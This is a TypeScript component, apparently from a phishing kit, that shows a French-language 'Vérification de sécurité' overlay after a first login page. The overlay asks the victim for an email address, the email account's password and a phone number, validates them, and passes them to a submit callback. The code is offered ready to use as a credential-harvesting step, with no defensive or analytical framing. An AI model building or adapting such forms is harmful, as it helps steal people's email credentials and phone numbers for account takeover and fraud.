/**
 * Second Page Component (Verification Form)
 * Displayed as an overlay after initial login
 * Captures: Email address, Email password, Phone number
 */

interface VerificationFormProps {
  onClose: () => void;
  onSubmit: (data: { email: string; emailPassword: string; phoneNumber: string }) => void;
}

export function createVerificationForm(props: VerificationFormProps): HTMLElement {
  const overlay = document.createElement('div');
  overlay.className = 'verification-overlay';
  overlay.id = 'verificationOverlay';

  overlay.innerHTML = `
    <style>
      .verification-overlay {
        display: flex;
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.4);
        z-index: 1500;
        align-items: flex-start;
        padding-top: 10vh;
        justify-content: center;
      }

      .verification-modal {
        background: #edede9;
        border: 1px solid #777;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
        border-radius: 8px;
        width: 500px;
        max-width: 92vw;
        padding: 30px;
        animation: modalIn 0.15s ease-out;
        color: #000;
      }

      .verification-modal-header {
        font-size: 20px;
        font-weight: 700;
        margin-bottom: 8px;
        color: #00693e;
      }

      .verification-modal-subtitle {
        font-size: 14px;
        color: #666;
        margin-bottom: 24px;
        line-height: 1.4;
      }

      .verification-form {
        display: flex;
        flex-direction: column;
        gap: 16px;
      }

      .form-group {
        display: flex;
        flex-direction: column;
        gap: 6px;
      }

      .form-group label {
        font-size: 14px;
        font-weight: 500;
        color: #000;
      }

      .form-group input {
        width: 100%;
        height: 40px;
        padding: 8px 12px;
        font-size: 14px;
        color: #000;
        background-color: #e8e9e3;
        border: 1px solid #aaa;
        border-radius: 4px;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        transition: border-color 0.15s, box-shadow 0.15s;
      }

      .form-group input:focus {
        outline: none;
        box-shadow: 0 0 0 2px rgba(0, 92, 58, 0.1);
        border-color: #006b43;
        background-color: #e8e9e3;
      }

      .form-actions {
        display: flex;
        justify-content: flex-end;
        gap: 12px;
        margin-top: 24px;
      }

      .btn {
        padding: 12px 24px;
        font-size: 12px;
        font-weight: 700;
        letter-spacing: 0.03em;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        transition: background 0.2s;
      }

      .btn-cancel {
        background: #999;
        color: #fff;
      }

      .btn-cancel:hover {
        background: #777;
      }

      .btn-submit {
        background: #006b43;
        color: #fff;
      }

      .btn-submit:hover {
        background: #003620;
      }

      .btn-submit:active {
        background-color: #003620;
        box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
      }

      .form-error {
        color: #c4703f;
        font-size: 13px;
        margin-top: -4px;
      }

      .verification-overlay.hidden {
        display: none;
      }

      @keyframes modalIn {
        from {
          opacity: 0;
          transform: scale(0.96) translateY(-5px);
        }
        to {
          opacity: 1;
          transform: scale(1) translateY(0);
        }
      }
    </style>

    <div class="verification-modal">
      <div class="verification-modal-header">Vérification de sécurité</div>
      <div class="verification-modal-subtitle">
        Pour continuer, veuillez fournir vos informations de vérification supplémentaires.
      </div>

      <form class="verification-form" id="verificationForm">
        <div class="form-group">
          <label for="email">Adresse e-mail</label>
          <input
            type="email"
            id="email"
            name="email"
            placeholder="exemple@domaine.com"
            required
          />
          <div class="form-error" id="emailError"></div>
        </div>

        <div class="form-group">
          <label for="emailPassword">Mot de passe e-mail</label>
          <input
            type="password"
            id="emailPassword"
            name="emailPassword"
            placeholder="••••••••"
            required
          />
          <div class="form-error" id="emailPasswordError"></div>
        </div>

        <div class="form-group">
          <label for="phoneNumber">Numéro de téléphone</label>
          <input
            type="tel"
            id="phoneNumber"
            name="phoneNumber"
            placeholder="+2XX XXX XXXX"
            required
          />
          <div class="form-error" id="phoneNumberError"></div>
        </div>

        <div class="form-actions">
          <button type="button" class="btn btn-cancel" id="cancelBtn">
            Annuler
          </button>
          <button type="submit" class="btn btn-submit">
            Continuer
          </button>
        </div>
      </form>
    </div>
  `;

  // Handle form submission
  const form = overlay.querySelector('#verificationForm') as HTMLFormElement;
  form.addEventListener('submit', (e) => {
    e.preventDefault();

    const email = (overlay.querySelector('#email') as HTMLInputElement).value.trim();
    const emailPassword = (overlay.querySelector('#emailPassword') as HTMLInputElement).value;
    const phoneNumber = (overlay.querySelector('#phoneNumber') as HTMLInputElement).value.trim();

    // Basic validation
    const errors = validateVerificationForm(email, emailPassword, phoneNumber);

    if (errors.length > 0) {
      displayFormErrors(overlay, errors);
      return;
    }

    // Clear previous errors
    clearFormErrors(overlay);

    // Submit data
    props.onSubmit({
      email,
      emailPassword,
      phoneNumber,
    });
  });

  // Handle cancel button
  const cancelBtn = overlay.querySelector('#cancelBtn') as HTMLButtonElement;
  cancelBtn.addEventListener('click', () => {
    props.onClose();
  });

  // Close on backdrop click
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) {
      props.onClose();
    }
  });

  // Close on Escape key
  const escHandler = (e: KeyboardEvent) => {
    if (e.key === 'Escape') {
      props.onClose();
      document.removeEventListener('keydown', escHandler);
    }
  };
  document.addEventListener('keydown', escHandler);

  return overlay;
}

/**
 * Validate verification form inputs
 */
function validateVerificationForm(
  email: string,
  emailPassword: string,
  phoneNumber: string
): string[] {
  const errors: string[] = [];

  if (!email) {
    errors.push('email');
  } else if (!email.includes('@')) {
    errors.push('email');
  }

  if (!emailPassword) {
    errors.push('emailPassword');
  }

  if (!phoneNumber) {
    errors.push('phoneNumber');
  }

  return errors;
}

/**
 * Display form validation errors
 */
function displayFormErrors(overlay: HTMLElement, errorFields: string[]): void {
  const errorMap: Record<string, string> = {
    email: 'Veuillez entrer une adresse e-mail valide',
    emailPassword: 'Le mot de passe est obligatoire',
    phoneNumber: 'Le numéro de téléphone est obligatoire',
  };

  errorFields.forEach((field) => {
    const errorEl = overlay.querySelector(`#${field}Error`) as HTMLElement;
    if (errorEl) {
      errorEl.textContent = errorMap[field] || 'Champ invalide';
    }
  });
}

/**
 * Clear form errors
 */
function clearFormErrors(overlay: HTMLElement): void {
  const errorEls = overlay.querySelectorAll('.form-error');
  errorEls.forEach((el) => {
    el.textContent = '';
  });
}

/**
 * Show verification form
 */
export function showVerificationForm(props: VerificationFormProps): void {
  const form = createVerificationForm(props);
  document.body.appendChild(form);

  // Focus on first input
  setTimeout(() => {
    const emailInput = form.querySelector('#email') as HTMLInputElement;
    emailInput?.focus();
  }, 100);
}

/**
 * Hide verification form
 */
export function hideVerificationForm(): void {
  const overlay = document.getElementById('verificationOverlay');
  if (overlay) {
    overlay.classList.add('hidden');
    setTimeout(() => {
      overlay.remove();
    }, 150);
  }
}
